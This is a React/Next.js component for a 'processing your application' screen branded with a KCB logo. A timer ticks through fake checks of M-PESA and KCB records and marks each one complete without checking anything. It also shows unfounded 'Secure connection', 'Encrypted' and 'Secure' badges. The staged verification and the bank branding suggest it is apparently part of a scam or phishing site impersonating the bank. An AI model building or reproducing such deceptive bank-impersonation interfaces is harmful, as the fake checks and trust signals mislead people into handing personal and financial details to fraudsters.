'use client'

import { useEffect, useState } from 'react'
import Image from 'next/image'
import { Loader2, CheckCircle, Shield, Lock } from 'lucide-react'

interface ProcessingPageProps {
  onComplete: () => void
}

export default function ProcessingPage({ onComplete }: ProcessingPageProps) {
  const [currentStep, setCurrentStep] = useState(0)
  const [isComplete, setIsComplete] = useState(false)

  const steps = [
    'Checking M-PESA records',
    'Checking KCB savings records',
    'Checking KCB M-PESA records',
  ]

  useEffect(() => {
    const stepInterval = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev < steps.length - 1) {
          return prev + 1
        }
        return prev
      })
    }, 1500)

    // Complete after all steps
    const completeTimeout = setTimeout(() => {
      setIsComplete(true)
      setTimeout(() => {
        onComplete()
      }, 1000)
    }, steps.length * 1500 + 1000)

    return () => {
      clearInterval(stepInterval)
      clearTimeout(completeTimeout)
    }
  }, [onComplete])

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        {/* Logo */}
        <div className="relative w-16 h-16 mx-auto mb-6">
          <Image 
            src="/image.png" 
            alt="KCB Logo" 
            fill
            className="object-contain"
          />
        </div>

        {/* Secure Connection Badge */}
        <div className="flex items-center justify-center gap-2 mb-6 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm mx-auto w-fit">
          <Shield className="w-4 h-4" />
          <span>Secure connection established</span>
        </div>

        {/* Loading Animation */}
        <div className="relative mb-8">
          <div className="animate-spin rounded-full h-20 w-20 border-4 border-gray-200 border-t-[#1a3c6e] mx-auto"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <Loader2 className="w-8 h-8 text-[#1a3c6e] animate-pulse" />
          </div>
        </div>

        {/* Title */}
        <h2 className="text-2xl font-bold text-[#1a3c6e] mb-2">
          Processing your application...
        </h2>
        <p className="text-gray-600 text-sm mb-6">
          Please wait while we verify your details
        </p>

        {/* Steps Progress */}
        <div className="space-y-3 text-left">
          {steps.map((step, index) => (
            <div 
              key={index}
              className={`flex items-center gap-3 p-3 rounded-lg transition-all duration-500 ${
                index < currentStep 
                  ? 'bg-green-50 text-green-700' 
                  : index === currentStep 
                  ? 'bg-blue-50 text-blue-700 border border-blue-200' 
                  : 'bg-gray-50 text-gray-400'
              }`}
            >
              {index < currentStep ? (
                <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
              ) : index === currentStep ? (
                <Loader2 className="w-5 h-5 text-blue-600 animate-spin flex-shrink-0" />
              ) : (
                <div className="w-5 h-5 border-2 border-gray-300 rounded-full flex-shrink-0"></div>
              )}
              <span className="text-sm font-medium">{step}</span>
              {index === currentStep && (
                <span className="ml-auto text-xs text-blue-600 animate-pulse">Checking...</span>
              )}
              {index < currentStep && (
                <span className="ml-auto text-xs text-green-600">✓ Complete</span>
              )}
            </div>
          ))}
        </div>

        {/* Trust Badges */}
        <div className="flex justify-center gap-6 mt-6 pt-6 border-t border-gray-200">
          <div className="flex items-center gap-2">
            <Lock className="w-4 h-4 text-gray-400" />
            <span className="text-xs text-gray-500">Encrypted</span>
          </div>
          <div className="flex items-center gap-2">
            <Shield className="w-4 h-4 text-gray-400" />
            <span className="text-xs text-gray-500">Secure</span>
          </div>
        </div>
      </div>
    </div>
  )
}